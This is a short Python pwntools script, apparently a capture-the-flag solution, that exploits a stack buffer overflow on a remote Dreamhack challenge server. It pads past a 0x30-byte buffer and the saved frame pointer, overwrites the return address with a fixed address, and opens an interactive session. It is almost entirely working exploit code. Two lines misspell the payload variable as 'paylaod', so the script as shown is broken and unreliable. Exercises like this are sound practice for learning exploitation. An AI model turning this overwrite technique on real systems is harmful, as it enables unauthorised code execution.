# file name : RetrunAddressOverwrite.py

from pwn import *

# Must be updated
p = remote("host3.dreamhack.games", 13511)

payload = b''
payload += b'A' * 0x30                            # buf
paylaod += b'B' * 0x8                             # SFP
paylaod += b'\xaa\x06\x40\x00\x00\x00\x00\x00'    # RET

p.sendlineafter("Input: ", payload)
p.interactive()
